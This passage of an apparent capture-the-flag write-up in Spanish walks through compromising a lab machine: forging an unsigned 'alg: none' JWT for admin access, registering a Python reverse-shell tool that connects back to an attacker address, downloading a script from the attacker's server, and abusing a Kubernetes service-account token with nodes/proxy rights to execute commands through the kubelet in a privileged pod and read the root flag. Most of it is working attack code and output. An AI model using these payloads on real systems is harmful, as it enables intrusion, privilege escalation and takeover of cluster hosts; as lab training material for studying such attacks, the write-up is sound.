        "type": "text",
        "text": "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data..."
      }
    ],
    "isError": false
  }
}
```
Esto nos confirma que las credenciales funcionan.

### Investigando los privilegios administrativos

Al intentar determinar si el servicio aplica correctamente la autorización en sus endpoints administrativos.
Recibimos
```json
{
  "detail": "Admin role required"
}
```
Efectivamente deja, pero con role de `admin`, pero ya sabemos que hay algo con **JWT**.

### Obtenemos el TOKEN para langflow-bot con role admin
Descubramos el token de `langflow-bot` con el role de `admin`.
Para ello vamos a generar el token con los campos que ya sabemos usando archivo en **Python**:
```python
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
payload = b64url(json.dumps({"sub": "langflow-bot", "role": "admin"}).encode())
token = f"{header}.{payload}."
print(token)
```
Lo ejecutamos:
```bash
python3 token.py 
eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAibGFuZ2Zsb3ctYm90IiwgInJvbGUiOiAiYWRtaW4ifQ.
```
Este TOKEN lo usaremos para acceder.

### Ejecución de una herramienta personalizada
Desde la shell que tenemos con el usuario ejecutamos:
```bash
TOKEN=eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAibGFuZ2Zsb3ctYm90IiwgInJvbGUiOiAiYWRtaW4ifQ.
```
Luego creamos la herramienta:
```bash
curl -s -X POST http://10.129.244.214:30080/api/v1/tools -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{
    "name": "rev_shell",
    "description": "Reverse shell variant",
    "code": "import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\"10.10.14.17\", 4443))\nos.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)\np=subprocess.call([\"/bin/sh\",\"-i\"])"
  }'
```
Si nos sale registrada, tuvimos exito.

Nos ponemos en escucha desde nuestra máquina:
```bash
nc -lvnp 4443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4443
Ncat: Listening on 0.0.0.0:4443
```

Ejecutamos la herramienta:
```bash
curl -s -X POST http://10.129.244.214:30080/mcp \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "rev_shell", "arguments": {}}, "id": 14}'
```
Y pudimos acceder:
```bash
/bin/sh: 0: can't access tty; job control turned off
$ whoami
mcp
```
Con un usuario llamado `mcp`, dentro de un contenedor.

## PRIVILEGE ESCALATION
Como estamos en un contenedor, revisamos si hay variables para **Kubernacles**:
```bash
$ env | grep -i k8s
$ env | grep -i k3s
$ env | grep -i kubernetes
KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT=tcp://10.43.0.1:443
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
KUBERNETES_PORT_443_TCP_PORT=443
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_SERVICE_HOST=10.43.0.1
```
Miramos si hay algún token que nos sirva:
```bash
$ ls -la /var/run/secrets/kubernetes.io/serviceaccount/
total 4
drwxrwxrwt 3 root root  140 Oct 12 11:31 .
drwxr-xr-x 3 root root 4096 Oct 12 11:31 ..
drwxr-xr-x 2 root root  100 Oct 12 11:31 ..2026_10_12_11_31_03.2216194966
lrwxrwxrwx 1 root root   32 Oct 12 11:31 ..data -> ..2026_10_12_11_31_03.2216194966
lrwxrwxrwx 1 root root   13 Oct 12 11:31 ca.crt -> ..data/ca.crt
lrwxrwxrwx 1 root root   16 Oct 12 11:31 namespace -> ..data/namespace
lrwxrwxrwx 1 root root   12 Oct 12 11:31 token -> ..data/token
```
Definimos las siguientes variables de entorno:
```bash
$ TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
$ NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
$ echo "Namespace: $NAMESPACE"
Namespace: default
```
Hacemos una consulta:
```bash
$ curl -s -k -H "Authorization: Bearer $TOKEN" https://10.43.0.1:443/api/v1/namespaces/$NAMESPACE/pods
```
Resultado:
```json
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "pods is forbidden: User \"system:serviceaccount:default:mcp-sa\" cannot list resource \"pods\" in API group \"\" in the namespace \"default\"",
  "reason": "Forbidden",
  "details": {
    "kind": "pods"
  },
  "code": 403
}
```

### Descubriendo vulnerabilidad
Pero no nos dice nada, ejecutamos esto:
```bash
curl -sk -X POST https://10.43.0.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" -H "Content-Type: application/json" -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'
```
Resultado:
```json
{
  "kind": "SelfSubjectRulesReview",
  "apiVersion": "authorization.k8s.io/v1",
  "metadata": {},
  "spec": {},
  "status": {
    "resourceRules": [
      {
        "verbs": [
          "get"
        ],
        "apiGroups": [
          ""
        ],
        "resources": [
          "nodes/proxy"
        ]
      },
      {
        "verbs": [
          "create"
        ],
        "apiGroups": [
          "authorization.k8s.io"
        ],
        "resources": [
          "selfsubjectaccessreviews",
          "selfsubjectrulesreviews"
        ]
      },
      {
        "verbs": [
          "create"
        ],
        "apiGroups": [
          "authentication.k8s.io"
        ],
        "resources": [
          "selfsubjectreviews"
        ]
      }
    ],
    "nonResourceRules": [
      {
        "verbs": [
          "get"
        ],
        "nonResourceURLs": [
          "/.well-known/openid-configuration",
          "/.well-known/openid-configuration/",
          "/openid/v1/jwks",
          "/openid/v1/jwks/"
        ]
      },
      {
        "verbs": [
          "get"
        ],
        "nonResourceURLs": [
          "/api",
          "/api/*",
          "/apis",
          "/apis/*",
          "/healthz",
          "/livez",
          "/openapi",
          "/openapi/*",
          "/readyz",
          "/version",
          "/version/"
        ]
      },
      {
        "verbs": [
          "get"
        ],
        "nonResourceURLs": [
          "/healthz",
          "/livez",
          "/readyz",
          "/version",
          "/version/"
        ]
      }
    ],
    "incomplete": false
  }
}
```
Esto es oro puro! Tenemos permisos de get sobre `nodes/proxy`.
Obtenemos los nodos que podemos usar:
```bash
curl -sk -H "Authorization: Bearer $TOKEN" https://10.43.0.1:443/api/v1/nodes/fireflow/proxy/pods/
```
Miramos los pods:
```bash
$ curl -sk "https://10.43.0.1:443/api/v1/nodes/fireflow/proxy/pods/" \^[E  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool | grep -B200 -A5 "privileged\": true" | grep -E "\"name\"|\"namespace\"|\"privileged\"|\"hostPath\"|\"path\""
    "name": "proc",
    "hostPath": {
        "path": "/proc",
    "name": "sys",
    "hostPath": {
        "path": "/sys",
    "name": "root",
    "hostPath": {
        "path": "/",
    "name": "node-exporter",
            "name": "metrics",
            "name": "HOST_IP",
            "name": "proc",
            "name": "sys",
            "name": "root",
            "path": "/",
            "path": "/",
        "privileged": true,
```
### Explotación de el mode-exporter
Escribí un script para poder aprovecharme de la vulnerabilidad `node-exporter` y mirar si puedo acceder al root:
```python
#!/usr/bin/env python3

import asyncio
import ssl
import sys
import websockets

NODE = "10.129.244.214"
NAMESPACE = "monitoring"
POD = "prometheus-prometheus-node-exporter-nmntq"
CONTAINER = "node-exporter"
TOKEN = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()

async def run_command(command, output_file=None):
    query = "&".join(f"command={word}" for word in command.split())
    url = f"wss://{NODE}:10250/exec/{NAMESPACE}/{POD}/{CONTAINER}?output=1&error=1&{query}"

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    output = []
    try:
        async with websockets.connect(
            url,
            ssl=ctx,
            additional_headers={"Authorization": f"Bearer {TOKEN}"},
            subprotocols=["v4.channel.k8s.io"],
        ) as ws:
            print(f"[+] Ejecutando: {command}")
            async for msg in ws:
                decoded = msg[1:].decode(errors="replace")
                output.append(decoded)
                if not output_file:
                    sys.stdout.write(decoded)
                    sys.stdout.flush()

        if output_file:
            with open(output_file, 'w') as f:
                f.write(''.join(output))
            print(f"[+] Output guardado en: {output_file}")

        return ''.join(output)

    except Exception as e:
        print(f"[-] Error: {e}")
        return None

if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "cat /root/root/root.txt"
    output = sys.argv[2] if len(sys.argv) > 2 else None
    
    asyncio.run(run_command(cmd, output))
```
Nos creamos ese archivo, ahora creamos un servidor con **Python**:
```bash
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
Desde la sesión en la máquina víctima, lo descargamos con `curl`:
```bash
curl -O http://10.10.14.17:8000/script.py 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1634  100  1634    0     0   3021      0 --:--:-- --:--:-- --:--:--  3020
```
Y luego ejecutamos una petición:
```bash
python3 script.py "ls -la /root"
[+] Ejecutando: ls -la /root
total 8
drwx------    2 root     root          4096 May 12 15:28 .
drwxr-xr-x    1 root     root          4096 Oct 12 11:31 ..
```
Y efectivamente podemos ejecutar comandos.

### Obtención de root flag
Buscamos la root flag:
```bash
$ python3 script.py "find / -name *root.txt"
[+] Ejecutando: find / -name *root.txt
/host/root/root/root.txt
```
Miremosla:
```bash
$ python3 script.py "cat /host/root/root/root.txt"
[+] Ejecutando: cat /host/root/root/root.txt
bd3c55fe4f9160015b96e2237afb411f
```
Obtenemos: `bd3c55fe4f9160015b96e2237afb411f`
